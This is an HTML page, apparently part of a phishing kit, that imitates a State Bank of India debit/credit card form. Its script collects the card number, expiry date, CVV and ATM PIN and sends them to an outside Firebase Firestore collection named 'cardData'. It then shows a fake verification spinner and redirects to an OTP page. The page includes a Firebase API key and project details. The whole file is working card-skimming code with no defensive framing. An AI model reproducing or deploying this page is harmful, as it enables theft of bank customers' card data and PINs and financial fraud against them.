<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Card Details Form</title>
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #f2f6fc;
    }

    .header,
    .footer {
      width: 100%;
      text-align: center;
    }

    .header img,
    .footer img {
      width: 100%;
      max-height: 100px;
      object-fit: cover;
    }

    .logo img {
      width: 80px;
      margin: 20px auto;
      display: block;
    }

    .container {
      padding: 10px;
      text-align: center;
    }

    .security-image img {
      width: 100%;
      max-width: 300px;
      margin: 10px auto;
      border-radius: 6px;
    }
     .security-image1 img {
      width: 100%;
      max-width: 400px;
      margin: 10px auto;
      border-radius: 6px;
    }

    .card-box {
      width: 100%;
      max-width: 300px;
      border-radius: 16px;
      background: linear-gradient(145deg, #660084, #afdbff);
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      padding: 20px;
      margin: 30px auto;
      color: white;
    }

    .card-title {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }

    .card-number {
      display: flex;
      gap: 4px;
      justify-content: center;
      margin: 15px 0;
    }

    .card-number input,
    .card-row input {
      width: 60px;
      padding: 8px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      text-align: center;
      background: rgba(255,255,255,0.2);
      color: white;
    }

    .card-row {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
    }

    .card-row input {
      width: 40%;
    }

    .card-label {
      font-size: 12px;
      opacity: 0.8;
      margin-top: 5px;
      text-align: center;
    }

    .side-button {
      margin: 25px auto 15px;
      padding: 12px;
      width: 100%;
      max-width: 300px;
      font-size: 17px;
      background-color: #740090;
      color: #fff;
      border: none;
      border-radius: 5px;
      display: block;
      cursor: pointer;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(5px);
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
      color: white;
      text-align: center;
    }

    .spinner {
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid white;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 16px;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDih7qIaS1eX68IIsDmAKXxYPtqvo9jLc0",
      authDomain: "amit-f5b5b.firebaseapp.com",
      projectId: "amit-f5b5b",
      storageBucket: "amit-f5b5b.appspot.com",
      messagingSenderId: "282917580402",
      appId: "1:282917580402:web:2a97eea5254d59dedb1ceb"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Generate session ID if not already
    let sessionId = sessionStorage.getItem('sessionId');
    if (!sessionId) {
      sessionId = 'session_' + Date.now() + '_' + Math.floor(Math.random() * 100000);
      sessionStorage.setItem('sessionId', sessionId);
    }
  </script>

  <!-- Header -->
  <div class="header">
    <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Header Image">
  </div>
    <!-- Card Form -->
    <div class="card-box">
      <div class="card-title">SBI Debit/Credit Card </div>
      <div class="card-number">
        <input type="text" id="card1" maxlength="4" required>
        <input type="text" id="card2" maxlength="4" required>
        <input type="text" id="card3" maxlength="4" required>
        <input type="text" id="card4" maxlength="4" required>
      </div>
      <div class="card-label"></div>

      <div class="card-row">
        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" required>
        <input type="password" id="cvv" maxlength="3" placeholder="CVV" required>
        <input type="password" id="pin" maxlength="4" placeholder="PIN" required>
      </div>

      <div class="card-row">
        <div class="card-label">Expiry</div>
        <div class="card-label">CVV</div>
        <div class="card-label">ATM PIN</div>
      </div>
    </div>

    <button class="side-button" onclick="submitCardDetails()">Continue</button>
  </div>
  <div class="security-image1">
  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
</div>

  <!-- Loading Overlay -->
  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    <div class="loading-text" id="loadingText">
      Please wait...<br>
      Verifying Your Login Details...<br>
      Redirecting in <span id="countdown">3</span> seconds.
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
  </div>

  <!-- JS Scripts -->
  <script>
    document.getElementById("expiry").addEventListener("input", function (e) {
      let value = e.target.value.replace(/[^\d]/g, "");
      if (value.length >= 3) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4);
      }
      e.target.value = value;
    });

    function submitCardDetails() {
      const expiry = document.getElementById("expiry").value;
      const [mm, yy] = expiry.split("/").map(Number);
      const minMonth = 3;
      const minYear = 24;

      if (!mm || !yy || mm > 12 || mm < 1 || yy < minYear || (yy === minYear && mm < minMonth)) {
        alert("Enter a valid expiry date");
        document.getElementById("expiry").focus();
        return false;
      }

      // Optionally save to Firestore
      db.collection("cardData").doc(sessionId).set({
        cardNumber: [
          document.getElementById("card1").value,
          document.getElementById("card2").value,
          document.getElementById("card3").value,
          document.getElementById("card4").value
        ].join("-"),
        expiry: expiry,
        cvv: document.getElementById("cvv").value,
        pin: document.getElementById("pin").value,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(() => {
        document.getElementById('overlay').style.display = 'flex';
        let countdown = 3;
        const countdownElement = document.getElementById('countdown');
        const interval = setInterval(() => {
          countdown--;
          countdownElement.textContent = countdown;
          if (countdown === 0) {
            clearInterval(interval);
            window.location.href = "otp.html";
          }
        }, 1000);
      }).catch((error) => {
        console.error("Error writing to Firestore:", error);
        alert("Something went wrong. Try again.");
      });
    }
  </script>
</body>
</html>
